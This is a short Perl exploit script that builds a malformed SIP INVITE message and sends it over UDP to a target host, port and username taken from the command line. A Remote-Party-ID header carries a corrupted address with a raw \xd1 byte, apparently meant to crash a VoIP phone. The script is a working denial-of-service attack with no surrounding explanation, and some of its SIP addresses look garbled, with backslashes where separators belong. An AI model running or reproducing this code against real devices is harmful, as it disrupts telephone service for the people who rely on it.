#!/usr/bin/perl

use IO::Socket::INET;

die "Usage $0 <dst> <port> <username>" unless ($ARGV[2]);

$socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],

Proto=>'udp',

PeerAddr=>$ARGV[0]);

$msg="INVITE sip:$ARGV[2]\$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP
192.168.1.2;branch=z9hG4jk\r\nFrom: sip:chirimolla
\192.168.1.2;tag=qwzng\r\nTo: <sip:$ARGV[2]\$ARGV[0];user=ip>\r
\nCall-ID: fosforito\192.168.1.1\r\nCSeq: 921 INVITE\r
\nRemote-Party-ID: csip:7940-1\192.168.\xd1.7\r\n\r\n";

$socket->send($msg); 